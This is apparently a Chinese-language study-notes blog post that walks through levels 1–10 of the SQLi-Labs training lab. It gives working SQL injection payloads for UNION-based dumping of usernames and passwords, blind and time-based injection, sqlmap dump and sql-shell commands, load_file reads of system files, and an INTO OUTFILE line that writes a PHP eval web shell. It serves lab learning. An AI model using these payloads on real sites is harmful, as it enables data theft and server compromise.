# SQLi-Labs 学习笔记（Less 1-10）

 

<div class="has-toc have-toc">
</div>

## 0x00 Background-1

项目地址：<a rel="noreferrer noopener" href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="nofollow" >https://github.com/Audi-1/sqli-labs</a>

Sqli-labs是SQL注入从入门到精通的专项漏洞靶场。

大佬撰写的MYSQL注入天书：<a rel="noreferrer noopener" href="https://github.com/lcamry/sqli-labs" target="_blank" rel="nofollow" >https://github.com/lcamry/sqli-labs</a>

几个常用的系统函数：

<pre class="wp-block-code"><code>version()——MySQL 版本
user()——数据库用户名
database()——数据库名
@@datadir——数据库路径
@@version_compile_os——操作系统版本</code></pre>

字符串连接函数

<pre class="wp-block-code"><code>concat(str1,str2,...)——没有分隔符地连接字符串
concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串
group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</code></pre>

一般用于尝试的语句 Ps:--+可以用#替换，url 提交过程中 Url 编码后的#为%23

<pre class="wp-block-code"><code>or 1=1--+
'or 1=1--+
"or 1=1--+
)or 1=1--+
')or 1=1--+
") or 1=1--+
"))or 1=1--+</code></pre>

SQL UNION 语法  
`SELECT column_name(s) FROM table_name1 UNION SELECT column_name(s) FROM table_name2`  
注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。  
SQL UNION ALL 语法  
`SELECT column_name(s) FROM table_name1 UNION ALL SELECT column_name(s) FROM table_name2`  
另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。

## 0x01 Less1<figure class="wp-block-image size-full">

<img loading="lazy" width="1278" height="287" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-136.png" alt="" class="wp-image-2750" /> </figure> 

`#`注释不可用，url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括`#`。将#号改成url的编码`%23`就可以了

`--`注释不可用，`--`与后面的符号连接在一起，无法形成有效的mysql语句。 将`--`号改成`--%20`就可以了。

构造`url/?id=1' order by 3--+`，得出数据有3列。接着构造`url/?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+`<figure class="wp-block-image size-full">

<img loading="lazy" width="664" height="137" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-137.png" alt="" class="wp-image-2751" /> </figure> 

接着构造`url/?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+`<figure class="wp-block-image size-full">

<img loading="lazy" width="1900" height="118" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-138.png" alt="" class="wp-image-2752" /> </figure> 

最后构造`url/?id=-1' union select 1,2,(select group_concat(username,'--',password) from users)--+`成功爆出数据。<figure class="wp-block-image size-full">

<img loading="lazy" width="1828" height="80" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-139.png" alt="" class="wp-image-2753" /> </figure> 

## 0x02 Less2

id是数字类型，不是字符类型，故不需要使用单引号，其他操作与Less1一样。

## 0x03 Less3

输入`url/?id=1'`,提示：MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1。

意味着，开发者使用的查询是：`Select login_name, select password from table where id= (‘our input here’`

所以，应该构造`url/?id=1')–-+` ，其他操作与Less1一样 。

## 0x04 Less4

代码当中对 id 参数进行了""和()的包装，应该构造`url/?id=1")--+`，其他操作与Less1一样。

## 0x05 Less5

这一关开始是盲注的内容。<figure class="wp-block-image size-full">

<img loading="lazy" width="1270" height="275" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-143.png" alt="" class="wp-image-2766" /> </figure> 

用sqlmap测试下当前的数据库。存在布尔型注入、报错注入、延时注入。<figure class="wp-block-image size-full">

<img loading="lazy" width="1001" height="528" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-144.png" alt="" class="wp-image-2770" /> </figure> 

`sqlmap -u url -D security -T users --dump`导出所有数据<figure class="wp-block-image size-full">

<img loading="lazy" width="319" height="399" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-145.png" alt="" class="wp-image-2772" /> </figure> 

如果还想查看数据库中其他表的数据，sqlmap还支持运行自定义sql语句（只支持查询语句）`sqlmap -u url --sql-shell`

## 0x06 Less6

利用`url/?id=1' and length(version())=6--+`，存在盲注，其他操作通Less5。

## 0x07 Background-3

`Load_file(file_name)`:读取文件并返回该文件的内容作为一个字符串。

使用条件：

A、必须有权限读取并且文件必须完全可读  
and (select count(\*) from mysql.user)>0/\* 如果结果返回正常,说明具有读写权限。  
and (select count(\*) from mysql.user)>0/\* 返回错误，应该是管理员给数据库帐户降权

B、欲读取文件必须在服务器上

C、必须指定文件完整的路径

D、欲读取文件必须小于 max\_allowed\_packe

<a href="https://www.cnblogs.com/lcamry/p/5729087.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >MySQL注入load_file常用路径</a>

范例1：`-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))`  
char(99,58,47,98,111,111,116,46,105,110,105)就是“c:/boot.ini”的 ASCII 代码

范例2：`-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)`  
c:/boot.ini的 16 进制是“0x633a2f626f6f742e696e69”

范例3：`-1 union select 1,1,1,load_file(c:\\boot.ini)`  
路径里的/用 \\代替

`LOAD DATA INFILE` 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。

范例：`load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t'<br>lines terminated by '\n'`

将/tmp/t0.txt 导入到 t0 表中，`character set gbk` 是字符集设置为 gbk，`fields terminated by` 是每一项数据之间的分隔符，`lines terminated by` 是行的结尾符。  
当错误代码是 2 的时候的时候，文件不存在，错误代码为 13 的时候是没有权限，可以考虑/tmp 等文件夹。

`SELECT.....INTO OUTFILE 'file_name'`可以把被选择的行写入一个文件中。使用条件：1、必须拥有 FILE权限；2、file_name 不能是一个已经存在的文件。

第一种利用形式，直接将 select 内容导入到文件中：

`Select <?php @eval($_post["mima"])?> into outfile "c:\\phpnow\\htdocs\\test.php"`

第二种利用形式，修改文件结尾:

`Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件`

## 0x08 Less7

标题是Dump into Outfile。需要利用文件导入的方式进行注入。需要提前在my.ini设置secure\_file\_priv。

`@@datadir` 读取数据库的路径，`@@basedir` 读取数据库安装路径id。跳回第一关获取。<figure class="wp-block-image size-full">

<img loading="lazy" width="932" height="103" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-154.png" alt="" class="wp-image-2826" /> </figure> 

输入`url/?id=-1')) union select 1,2,'' into outfile "D:\phpStudy\WWW\sqli-labs\Less-7\cmd.txt"--%20`<figure class="wp-block-image size-full">

<img loading="lazy" width="491" height="108" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-156.png" alt="" class="wp-image-2831" /> </figure> 

## 0x09 Less8

输入`url/?id=1' and` `sleep(5)--+`存在延时注入。

爆破库`url/?id=1' and if(ord(substr((select database()),1,1))=115,1,sleep(5))--+`

接着爆破表、字段，最后爆破数据用`url/?id=1' and if(substr((select group_concat(concat_ws('-',username,password)) from security.users limit 0,1),1,1)='d',1,sleep(5))--+`

用bp来试着爆破一下数据Dumb-Dumb。<figure class="wp-block-image size-full">

<img loading="lazy" width="842" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-161.png" alt="" class="wp-image-2843" /></figure> 

## 0x0A Less9

题目是延时注入-单引号，

可以搭配二分法猜解`url/?id=1' and if(ascii(substr(database(),1,1))>110, 0, sleep(5))--+`

## 0x0B Less10

与Less9的区别就在于'->"，其他操作一致。
